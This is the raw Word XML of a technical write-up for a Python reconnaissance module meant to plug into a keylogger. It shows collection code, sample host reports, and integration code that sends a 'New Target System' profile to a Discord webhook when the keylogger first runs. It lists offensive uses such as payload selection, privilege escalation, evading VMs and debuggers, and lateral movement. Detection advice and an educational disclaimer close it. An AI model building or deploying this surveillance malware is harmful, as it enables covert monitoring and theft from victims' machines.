        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    def gather_all(self):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        """Collect all available system information"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['basic'] = self.get_basic_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['network'] = self.get_network_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['hardware'] = self.get_hardware_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['software'] = self.get_software_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['user'] = self.get_user_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info['security'] = self.get_security_info()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return self.info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Key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Library</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OS and architecture information</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>socket</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Network configuration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>os</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>File system and environment variables</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>psutil</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Hardware specs, processes, system resources</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subprocess</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Execute system commands</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wmi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>External (Windows)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Windows Management Instrumentation queries</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>JSON serialization</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>datetime</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Built-in</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Timestamps</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Output Formats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Formatted Text Output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The module generates human-readable text reports with clear sections and formatting:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>================================================================================</w:t>
        <w:br/>
        <w:t>SYSTEM INFORMATION REPORT</w:t>
        <w:br/>
        <w:t>================================================================================</w:t>
        <w:br/>
        <w:t>Generated: 2025-11-22 09:01:36</w:t>
        <w:br/>
        <w:br/>
        <w:t>--------------------------------------------------------------------------------</w:t>
        <w:br/>
        <w:t>BASIC INFORMATION</w:t>
        <w:br/>
        <w:t>--------------------------------------------------------------------------------</w:t>
        <w:br/>
        <w:t>Hostname: DESKTOP-UL7LVGN</w:t>
        <w:br/>
        <w:t>Platform: Windows</w:t>
        <w:br/>
        <w:t>Platform Release: 11</w:t>
        <w:br/>
        <w:t>Architecture: AMD64</w:t>
        <w:br/>
        <w:t>Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel</w:t>
        <w:br/>
        <w:br/>
        <w:t>--------------------------------------------------------------------------------</w:t>
        <w:br/>
        <w:t>HARDWARE INFORMATION</w:t>
        <w:br/>
        <w:t>--------------------------------------------------------------------------------</w:t>
        <w:br/>
        <w:t>CPU:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Physical Cores: 4</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Total Cores: 8</w:t>
        <w:br/>
        <w:t xml:space="preserve">  CPU Usage: 12.5%</w:t>
        <w:br/>
        <w:br/>
        <w:t>Memory:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Total: 7.64 GB</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Used: 6.69 GB</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Percentage: 87.6%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 JSON Output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Machine-readable JSON format for automated processing and integration with other tools:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "timestamp": "2025-11-22 09:01:36",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "basic": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "hostname": "DESKTOP-UL7LVGN",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "platform": "Windows",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "platform_release": "11",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "architecture": "AMD64"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "hardware": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "cpu": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "physical_cores": 4,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "total_cores": 8,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "cpu_usage": "12.5%"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Integration with Keylogger System</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Integration Strategy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The system information module can be integrated into the keylogger to send reconnaissance data on first execution:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>from system_info import SystemInfo</w:t>
        <w:br/>
        <w:t>import network_sender</w:t>
        <w:br/>
        <w:br/>
        <w:t>def send_initial_recon():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """Send system information on first execution"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sys_info = SystemInfo()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sys_info.gather_all()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Format as text</w:t>
        <w:br/>
        <w:t xml:space="preserve">    info_text = sys_info.to_formatted_text()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Send via Discord webhook</w:t>
        <w:br/>
        <w:t xml:space="preserve">    network_sender.send_log(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "🖥️ New Target System Detected",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        info_text</w:t>
        <w:br/>
        <w:t xml:space="preserve">    )</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Save locally</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sys_info.save_to_file("target_info.txt")</w:t>
        <w:br/>
        <w:br/>
        <w:t># Call in main() before starting keylogger</w:t>
        <w:br/>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
        <w:t xml:space="preserve">    send_initial_recon()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ... rest of keylogger code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Practical Use Cases</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Initial Reconnaissance: </w:t>
      </w:r>
      <w:r>
        <w:t>Send complete system profile immediately after deployment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Targeted Payload Selection: </w:t>
      </w:r>
      <w:r>
        <w:t>Choose exploits based on OS version and installed software</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Privilege Escalation Planning: </w:t>
      </w:r>
      <w:r>
        <w:t>Identify if admin privileges are needed and plan accordingly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Anti-Analysis: </w:t>
      </w:r>
      <w:r>
        <w:t>Detect VMs and debuggers to avoid security researcher analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Network Mapping: </w:t>
      </w:r>
      <w:r>
        <w:t>Identify network configuration for lateral movement planning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Resource Assessment: </w:t>
      </w:r>
      <w:r>
        <w:t>Determine if system has sufficient resources for additional payloads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Performance Metrics</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="MediumGrid1-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Execution Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>1-3 seconds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Complete data collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Memory Usage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>20-30 MB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Peak memory consumption</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CPU Usage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>&lt;5%</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>During execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Disk I/O</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Minimal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Only for saving output files</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Network Traffic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0 bytes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>No network activity (unless sending to C2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>File Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>~350 lines</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Source code</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Output Size (Text)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2-5 KB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Formatted text report</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Output Size (JSON)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>3-8 KB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>JSON format</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Detection and Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 How to Detect This Module</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Security professionals can detect this reconnaissance activity through:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Monitoring WMI queries (Windows Management Instrumentation)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detecting unusual psutil library usage patterns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tracking file system access to /proc/ directories (Linux)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Monitoring registry access patterns (Windows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Behavioral analysis of processes querying extensive system data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Network monitoring for exfiltration of system information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>File integrity monitoring for output files (system_info.txt, system_info.json)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 Defensive Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Endpoint Detection and Response (EDR): </w:t>
      </w:r>
      <w:r>
        <w:t>Deploy EDR solutions to detect reconnaissance behavior</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Application Whitelisting: </w:t>
      </w:r>
      <w:r>
        <w:t>Block unauthorized Python scripts and executables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Behavioral Analysis: </w:t>
      </w:r>
      <w:r>
        <w:t>Flag processes making extensive system queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Network Segmentation: </w:t>
      </w:r>
      <w:r>
        <w:t>Prevent lateral movement after reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Honeypot Indicators: </w:t>
      </w:r>
      <w:r>
        <w:t>Plant fake system information to detect malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Least Privilege: </w:t>
      </w:r>
      <w:r>
        <w:t>Limit user permissions to reduce information disclosure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Security Monitoring: </w:t>
      </w:r>
      <w:r>
        <w:t>Alert on suspicious WMI, psutil, or /proc access patterns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. Ethical and Legal Considerations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">WARNING: </w:t>
      </w:r>
      <w:r>
        <w:t>This module is designed for educational purposes and authorized penetration testing only. Unauthorized system reconnaissance is illegal in most jurisdictions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ethical Guidelines:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Only use on systems you own or have explicit written authorization to test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Comply with all local, state, and federal computer crime laws</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use in controlled, isolated environments for cybersecurity research</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Do not deploy on production systems without proper authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Maintain responsible disclosure practices for any discovered vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Document educational intent and research purpose clearly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Secure all collected data and prevent unauthorized access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The System Information Gathering module demonstrates how modern malware performs initial reconnaissance to understand the target environment. By collecting comprehensive system data, attackers can make informed decisions about payload selection, privilege escalation strategies, and evasion techniques.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>From a defensive perspective, understanding these reconnaissance techniques is crucial for developing effective detection and prevention strategies. Security professionals must monitor for unusual system queries, WMI access patterns, and data exfiltration attempts to identify malware in the early stages of an attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This module serves as an educational tool to demonstrate both offensive reconnaissance capabilities and the defensive measures needed to protect against such techniques. The comprehensive data collection showcases the depth of information available to attackers and highlights the importance of robust endpoint security solutions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix: Sample Output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Below is a sample output from the system information gathering module executed on a Windows 11 system:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>Hostname: DESKTOP-UL7LVGN</w:t>
        <w:br/>
        <w:t>Platform: Windows 11</w:t>
        <w:br/>
        <w:t>Architecture: AMD64</w:t>
        <w:br/>
        <w:t>Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel</w:t>
        <w:br/>
        <w:t>Local IP: 10.165.92.170</w:t>
        <w:br/>
        <w:t>CPU: 4 physical cores, 8 total cores @ 2496 MHz</w:t>
        <w:br/>
        <w:t>Memory: 7.64 GB total, 87.6% used</w:t>
        <w:br/>
        <w:t>Username: 91984</w:t>
        <w:br/>
        <w:t>Admin Privileges: False</w:t>
        <w:br/>
        <w:t>Firewall: Enabled</w:t>
        <w:br/>
        <w:t>Virtual Machine: False</w:t>
        <w:br/>
        <w:t>Debugger Present: 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